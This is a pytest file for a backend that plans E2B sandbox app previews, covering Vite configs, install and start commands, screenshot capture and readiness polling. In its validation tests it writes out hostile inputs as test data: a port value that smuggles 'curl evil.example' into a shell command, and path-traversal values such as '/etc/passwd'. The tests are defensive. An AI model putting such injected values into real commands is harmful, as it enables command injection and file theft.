# backend/tests/test_e2b_application_preview.py
#
# Regression tests for E2B application-preview planning.
# These tests keep sandbox creation out of scope and verify deterministic file,
# dependency, and dev-server command planning for the later worker slice.

from __future__ import annotations

import json
import base64
import sys
from pathlib import Path
from types import SimpleNamespace

import pytest

from backend.shared.providers.e2b_application_preview import (
    ApplicationPreviewEntrypoint,
    ApplicationPreviewFile,
    ApplicationPreviewPlanningError,
    _sandbox_screenshot_bytes,
    _application_screenshot_command,
    _vite_allowed_hosts,
    _wait_for_preview_ready,
    _with_vite_preview_settings,
    _with_vite_allowed_hosts,
    _write_vite_allowed_hosts_config,
    plan_application_preview_startup,
    start_application_preview_in_e2b,
)


# contract-test: supporting surface=gui.web assertions=app-skills.media.application-screenshot
def test_application_preview_fixture_uses_deterministic_svelte5_runtime() -> None:
    fixture_path = Path(__file__).resolve().parents[1] / "apps/ai/testing/fixtures/application_preview.json"
    fixture = json.loads(fixture_path.read_text())
    files = fixture["embeds"]["11111111-1111-4111-8111-111111111111"]["files"]
    by_path = {file["path"]: file for file in files}

    package_json = by_path["package.json"]["content"]
    main_ts = by_path["src/main.ts"]["content"]

    assert "latest" not in package_json
    assert '"vite":"^5.4.21"' in package_json
    assert '"svelte":"^5.55.7"' in package_json
    assert "import { mount } from 'svelte';" in main_ts
    assert "new App" not in main_ts


# contract-test: supporting surface=gui.web assertions=app-skills.media.application-screenshot
def test_preview_planning_normalizes_files_and_frontend_commands() -> None:
    plan = plan_application_preview_startup(
        files=[
            ApplicationPreviewFile(path="package.json", content='{"scripts":{"dev":"vite"}}'),
            ApplicationPreviewFile(path="src/App.svelte", content="<main>Hello</main>"),
        ],
        entrypoints=[ApplicationPreviewEntrypoint(name="frontend", command="npm run dev", port=5173)],
    )

    assert [file.path for file in plan.files] == ["package.json", "src/App.svelte"]
    assert plan.install_commands == ["npm install --ignore-scripts --no-audit --no-fund"]
    assert plan.start_commands == [{"name": "frontend", "command": "npm run dev -- --host 0.0.0.0", "port": 5173}]


# contract-test: supporting surface=gui.web assertions=app-skills.media.application-screenshot
def test_preview_planning_supports_fastapi_backend_entrypoint() -> None:
    plan = plan_application_preview_startup(
        files=[
            ApplicationPreviewFile(path="requirements.txt", content="fastapi\nuvicorn\n"),
            ApplicationPreviewFile(path="backend/main.py", content="from fastapi import FastAPI\napp = FastAPI()\n"),
        ],
        entrypoints=[ApplicationPreviewEntrypoint(name="api", command="uvicorn backend.main:app", port=8000)],
    )

    assert plan.install_commands == ["python -m pip install -r requirements.txt"]
    assert plan.start_commands == [{"name": "api", "command": "uvicorn backend.main:app --host 0.0.0.0 --port 8000", "port": 8000}]


# contract-test: supporting surface=gui.web assertions=app-skills.media.application-screenshot
def test_preview_planning_does_not_add_hidden_tailwind_configs() -> None:
    plan = plan_application_preview_startup(
        files=[
            ApplicationPreviewFile(
                path="package.json",
                content=(
                    '{"scripts":{"dev":"vite"},'
                    '"devDependencies":{"@vitejs/plugin-react":"latest","tailwindcss":"latest","postcss":"latest","autoprefixer":"latest"}}'
                ),
            ),
            ApplicationPreviewFile(path="index.html", content='<div id="root"></div><script type="module" src="/src/main.tsx"></script>'),
            ApplicationPreviewFile(path="src/index.css", content="@tailwind base;\n@tailwind components;\n@tailwind utilities;\nbody { @apply bg-gray-50; }\n"),
        ],
        entrypoints=[ApplicationPreviewEntrypoint(name="frontend", command="npm run dev", port=5173)],
    )

    paths = {file.path for file in plan.files}
    assert paths == {"package.json", "index.html", "src/index.css"}
    assert "postcss.config.cjs" not in {file.path for file in plan.files}
    assert "tailwind.config.cjs" not in paths


# contract-test: supporting surface=gui.web assertions=app-skills.media.application-screenshot
def test_preview_planning_keeps_existing_tailwind_configs() -> None:
    plan = plan_application_preview_startup(
        files=[
            ApplicationPreviewFile(path="package.json", content='{"scripts":{"dev":"vite"},"devDependencies":{"tailwindcss":"latest"}}'),
            ApplicationPreviewFile(path="tailwind.config.js", content="export default {};\n"),
            ApplicationPreviewFile(path="postcss.config.js", content="export default {};\n"),
            ApplicationPreviewFile(path="src/index.css", content="@tailwind base;\n"),
        ],
        entrypoints=[ApplicationPreviewEntrypoint(name="frontend", command="npm run dev", port=5173)],
    )

    paths = [file.path for file in plan.files]
    assert paths.count("tailwind.config.js") == 1
    assert paths.count("postcss.config.js") == 1
    assert "tailwind.config.cjs" not in paths
    assert "postcss.config.cjs" not in paths


# contract-test: supporting surface=gui.web assertions=app-skills.media.application-screenshot
def test_preview_start_command_allows_exact_e2b_vite_hosts() -> None:
    hosts = _vite_allowed_hosts(
        {
            "frontend": "https://5173-izr5goe7od08cvlqzemo8.e2b.app",
            "duplicate": "https://5173-izr5goe7od08cvlqzemo8.e2b.app/",
        }
    )

    command = _with_vite_allowed_hosts("npm run dev -- --host 0.0.0.0", hosts)

    assert hosts == ["5173-izr5goe7od08cvlqzemo8.e2b.app"]
    assert command == "__VITE_ADDITIONAL_SERVER_ALLOWED_HOSTS=5173-izr5goe7od08cvlqzemo8.e2b.app npm run dev -- --host 0.0.0.0"


# contract-test: supporting surface=gui.web assertions=app-skills.media.application-screenshot
def test_preview_start_command_uses_generated_vite_config() -> None:
    command = _with_vite_preview_settings(
        "npm run dev -- --host 0.0.0.0",
        ["5173-izr5goe7od08cvlqzemo8.e2b.app"],
        "vite.config.openmates.mjs",
    )

    assert command == (
        "__VITE_ADDITIONAL_SERVER_ALLOWED_HOSTS=5173-izr5goe7od08cvlqzemo8.e2b.app "
        "npm run dev -- --host 0.0.0.0 --config vite.config.openmates.mjs"
    )


# contract-test: supporting surface=gui.web assertions=app-skills.media.application-screenshot
def test_preview_writes_generated_vite_allowed_hosts_config() -> None:
    class FakeFiles:
        def __init__(self) -> None:
            self.payloads = []

        def write_files(self, payload):
            self.payloads.append(payload)

    class FakeSandbox:
        def __init__(self) -> None:
            self.files = FakeFiles()

    sandbox = FakeSandbox()

    path = _write_vite_allowed_hosts_config(
        sandbox,
        [ApplicationPreviewFile(path="package.json", content='{"devDependencies":{"vite":"^5.0.0"}}')],
        ["5173-izr5goe7od08cvlqzemo8.e2b.app"],
    )

    assert path == "vite.config.openmates.mjs"
    written = sandbox.files.payloads[0][0]
    assert written["path"] == "vite.config.openmates.mjs"
    assert "allowedHosts: ['5173-izr5goe7od08cvlqzemo8.e2b.app']" in written["data"]
    assert "hmr: false" in written["data"]
    assert "openmatesStaticPreview()" in written["data"]
    assert "@vite\\/client" in written["data"]


# contract-test: supporting surface=gui.web assertions=app-skills.media.application-screenshot
def test_preview_writes_svelte_plugin_when_generated_svelte_app_has_no_vite_config() -> None:
    class FakeFiles:
        def __init__(self) -> None:
            self.payloads = []

        def write_files(self, payload):
            self.payloads.append(payload)

    class FakeSandbox:
        def __init__(self) -> None:
            self.files = FakeFiles()

    sandbox = FakeSandbox()

    path = _write_vite_allowed_hosts_config(
        sandbox,
        [
            ApplicationPreviewFile(
                path="package.json",
                content='{"devDependencies":{"vite":"^5.0.0","@sveltejs/vite-plugin-svelte":"latest"}}',
            ),
            ApplicationPreviewFile(path="src/App.svelte", content="<main>Hello</main>"),
        ],
        ["5173-izr5goe7od08cvlqzemo8.e2b.app"],
    )

    assert path == "vite.config.openmates.mjs"
    written = sandbox.files.payloads[0][0]
    assert "import { svelte } from '@sveltejs/vite-plugin-svelte';" in written["data"]
    assert "plugins: [svelte(), openmatesStaticPreview()]" in written["data"]
    assert "allowedHosts: ['5173-izr5goe7od08cvlqzemo8.e2b.app']" in written["data"]
    assert "hmr: false" in written["data"]
    assert "@vite\\/client" in written["data"]


# contract-test: supporting surface=gui.web assertions=app-skills.media.application-screenshot
def test_preview_writes_openmates_vite_config_even_when_app_has_existing_vite_config() -> None:
    class FakeFiles:
        def __init__(self) -> None:
            self.payloads = []

        def write_files(self, payload):
            self.payloads.append(payload)

    class FakeSandbox:
        def __init__(self) -> None:
            self.files = FakeFiles()

    sandbox = FakeSandbox()

    path = _write_vite_allowed_hosts_config(
        sandbox,
        [
            ApplicationPreviewFile(path="package.json", content='{"devDependencies":{"vite":"^5.0.0","@sveltejs/vite-plugin-svelte":"latest"}}'),
            ApplicationPreviewFile(path="vite.config.js", content="import { svelte } from '@sveltejs/vite-plugin-svelte';\n"),
        ],
        ["5173-izr5goe7od08cvlqzemo8.e2b.app"],
    )

    assert path == "vite.config.openmates.mjs"
    written = sandbox.files.payloads[0][0]
    assert written["path"] == "vite.config.openmates.mjs"
    assert "import { svelte } from '@sveltejs/vite-plugin-svelte';" in written["data"]
    assert "plugins: [svelte(), openmatesStaticPreview()]" in written["data"]
    assert "allowedHosts: ['5173-izr5goe7od08cvlqzemo8.e2b.app']" in written["data"]


PNG_BYTES = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+/lXcAAAAASUVORK5CYII="
)


# contract-test: supporting surface=gui.web assertions=app-skills.media.application-screenshot
def test_preview_reads_real_screenshot_bytes_from_sandbox_hook() -> None:
    class FakeSandbox:
        def take_screenshot(self, *, format: str):
            assert format == "bytes"
            return PNG_BYTES

    assert _sandbox_screenshot_bytes(FakeSandbox(), 5173) == PNG_BYTES


# contract-test: supporting surface=gui.web assertions=app-skills.media.application-screenshot
def test_preview_captures_running_local_app_without_optional_hook() -> None:
    class FakeCommands:
        def __init__(self) -> None:
            self.calls: list[tuple[str, int]] = []

        def run(self, command: str, *, timeout: int):
            self.calls.append((command, timeout))
            if len(self.calls) == 1:
                return SimpleNamespace(exit_code=0, stdout="", stderr="")
            return SimpleNamespace(exit_code=0, stdout=base64.b64encode(PNG_BYTES).decode(), stderr="")

    sandbox = SimpleNamespace(commands=FakeCommands())
    assert _sandbox_screenshot_bytes(sandbox, 5173) == PNG_BYTES
    assert len(sandbox.commands.calls) == 2
    assert "/tmp/openmates-application-capture" in sandbox.commands.calls[0][0]
    assert "playwright install --with-deps chromium" in sandbox.commands.calls[0][0]
    assert "http://127.0.0.1:5173/" in sandbox.commands.calls[1][0]
    assert "https://" not in sandbox.commands.calls[1][0]


@pytest.mark.parametrize(
    ("install_result", "capture_result", "diagnostic"),
    [
        (SimpleNamespace(exit_code=1, stdout="", stderr="install failed"), None, "browser install failed: install failed"),
        (SimpleNamespace(exit_code=0, stdout="", stderr=""), SimpleNamespace(exit_code=1, stdout="", stderr="browser crashed"), "capture failed: browser crashed"),
        (SimpleNamespace(exit_code=0, stdout="", stderr=""), SimpleNamespace(exit_code=0, stdout="not base64", stderr=""), "invalid base64"),
        (SimpleNamespace(exit_code=0, stdout="", stderr=""), SimpleNamespace(exit_code=0, stdout=base64.b64encode(b"not a png").decode(), stderr=""), "invalid PNG"),
    ],
)
# contract-test: supporting surface=gui.web assertions=app-skills.media.application-screenshot
def test_preview_capture_reports_browser_failure(install_result, capture_result, diagnostic: str) -> None:
    class FakeCommands:
        def __init__(self) -> None:
            self.results = iter([install_result] + ([capture_result] if capture_result else []))

        def run(self, command: str, *, timeout: int):
            return next(self.results)

    with pytest.raises(RuntimeError, match=diagnostic):
        _sandbox_screenshot_bytes(SimpleNamespace(commands=FakeCommands()), 5173)


# contract-test: supporting surface=gui.web assertions=app-skills.media.application-screenshot
def test_preview_capture_rejects_untrusted_port_before_shell_interpolation() -> None:
    with pytest.raises(ApplicationPreviewPlanningError, match="port"):
        _application_screenshot_command("5173; curl evil.example")  # type: ignore[arg-type]


# contract-test: supporting surface=gui.web assertions=app-skills.media.application-screenshot
def test_preview_capture_limits_chromium_processes_in_e2b() -> None:
    command = _application_screenshot_command(5173)
    assert "'--single-process'" in command
    assert "'--js-flags=--jitless'" in command
    assert "'--disable-dev-shm-usage'" in command
    assert "http://127.0.0.1:5173/" in command


# contract-test: supporting surface=gui.web assertions=app-skills.media.application-screenshot
def test_preview_start_reports_capture_failure_and_stops_sandbox(monkeypatch: pytest.MonkeyPatch) -> None:
    from backend.shared.providers import e2b_application_preview

    class FakeCommands:
        def run(self, command: str, *, timeout: int, background: bool = False):
            if background:
                return SimpleNamespace(exit_code=0, stdout="", stderr="")
            if "playwright install" in command:
                return SimpleNamespace(exit_code=0, stdout="", stderr="")
            return SimpleNamespace(exit_code=1, stdout="", stderr="Chromium unavailable")

    class FakeSandbox:
        killed: list[str] = []

        def __init__(self) -> None:
            self.sandbox_id = "preview-sandbox"
            self.commands = FakeCommands()
            self.files = SimpleNamespace(write_files=lambda payload: None)

        @classmethod
        def create(cls, **kwargs):
            assert kwargs["timeout"] >= 600
            return cls()

        @classmethod
        def kill(cls, *, sandbox_id: str, api_key: str):
            cls.killed.append(sandbox_id)
            return True

        def get_host(self, port: int) -> str:
            return f"{port}-preview.e2b.app"

    monkeypatch.setitem(sys.modules, "e2b", SimpleNamespace(Sandbox=FakeSandbox))
    monkeypatch.setattr(e2b_application_preview, "_wait_for_preview_ready", lambda url: None)

    with pytest.raises(RuntimeError, match="Application screenshot capture failed: Chromium unavailable"):
        start_application_preview_in_e2b(
            files=[ApplicationPreviewFile(path="index.html", content="<main>Preview</main>")],
            entrypoints=[ApplicationPreviewEntrypoint(name="frontend", command="python3 -m http.server 5173", port=5173)],
            api_key="example-key",
        )
    assert FakeSandbox.killed == ["preview-sandbox"]


# contract-test: supporting surface=gui.web assertions=app-skills.media.application-screenshot
def test_preview_readiness_waits_through_transient_e2b_502() -> None:
    statuses = iter([502, 502, 200, 200])
    sleeps: list[float] = []

    _wait_for_preview_ready(
        "https://5173-example.e2b.app/",
        timeout_seconds=5,
        interval_seconds=0.01,
        fetch_status=lambda _: next(statuses),
        sleep=sleeps.append,
    )

    assert sleeps == [0.01, 0.01, 0.01]


# contract-test: supporting surface=gui.web assertions=app-skills.media.application-screenshot
def test_preview_readiness_requires_consecutive_successes() -> None:
    statuses = iter([200, 502, 200, 200])
    sleeps: list[float] = []

    _wait_for_preview_ready(
        "https://5173-example.e2b.app/",
        timeout_seconds=5,
        interval_seconds=0.01,
        fetch_status=lambda _: next(statuses),
        sleep=sleeps.append,
    )

    assert sleeps == [0.01, 0.01, 0.01]


# contract-test: supporting surface=gui.web assertions=app-skills.media.application-screenshot
def test_preview_readiness_waits_through_e2b_root_404() -> None:
    statuses = iter([404, 404, 200, 200])
    sleeps: list[float] = []

    _wait_for_preview_ready(
        "https://5173-example.e2b.app/",
        timeout_seconds=5,
        interval_seconds=0.01,
        fetch_status=lambda _: next(statuses),
        sleep=sleeps.append,
    )

    assert sleeps == [0.01, 0.01, 0.01]


# contract-test: supporting surface=gui.web assertions=app-skills.media.application-screenshot
def test_preview_readiness_times_out_with_last_status() -> None:
    with pytest.raises(RuntimeError, match="last status 502"):
        _wait_for_preview_ready(
            "https://5173-example.e2b.app/",
            timeout_seconds=0,
            fetch_status=lambda _: 502,
            sleep=lambda _: None,
        )


# contract-test: supporting surface=gui.web assertions=app-skills.media.application-screenshot
def test_preview_start_command_does_not_duplicate_vite_allowed_hosts_env() -> None:
    command = _with_vite_allowed_hosts(
        "__VITE_ADDITIONAL_SERVER_ALLOWED_HOSTS=custom.example npm run dev",
        ["5173-izr5goe7od08cvlqzemo8.e2b.app"],
    )

    assert command == "__VITE_ADDITIONAL_SERVER_ALLOWED_HOSTS=custom.example npm run dev"


@pytest.mark.parametrize("path", ["/etc/passwd", "../secret.txt", "src/../../secret.txt", ""])
# contract-test: supporting surface=gui.web assertions=app-skills.media.application-screenshot
def test_preview_planning_rejects_unsafe_paths(path: str) -> None:
    with pytest.raises(ApplicationPreviewPlanningError):
        plan_application_preview_startup(
            files=[ApplicationPreviewFile(path=path, content="x")],
            entrypoints=[ApplicationPreviewEntrypoint(name="frontend", command="npm run dev", port=5173)],
        )


# contract-test: supporting surface=gui.web assertions=app-skills.media.application-screenshot
def test_preview_planning_rejects_secret_like_file_content() -> None:
    with pytest.raises(ApplicationPreviewPlanningError, match="secrets"):
        plan_application_preview_startup(
            files=[ApplicationPreviewFile(path="src/main.ts", content="const apiKey = 'sk-test-secret-token-1234567890';")],
            entrypoints=[ApplicationPreviewEntrypoint(name="frontend", command="npm run dev", port=5173)],
        )


# contract-test: supporting surface=gui.web assertions=app-skills.media.application-screenshot
def test_preview_planning_requires_entrypoints_and_ports() -> None:
    with pytest.raises(ApplicationPreviewPlanningError, match="entrypoint"):
        plan_application_preview_startup(files=[ApplicationPreviewFile(path="index.html", content="ok")], entrypoints=[])

    with pytest.raises(ApplicationPreviewPlanningError, match="port"):
        plan_application_preview_startup(
            files=[ApplicationPreviewFile(path="index.html", content="ok")],
            entrypoints=[ApplicationPreviewEntrypoint(name="frontend", command="npm run dev", port=70_000)],
        )
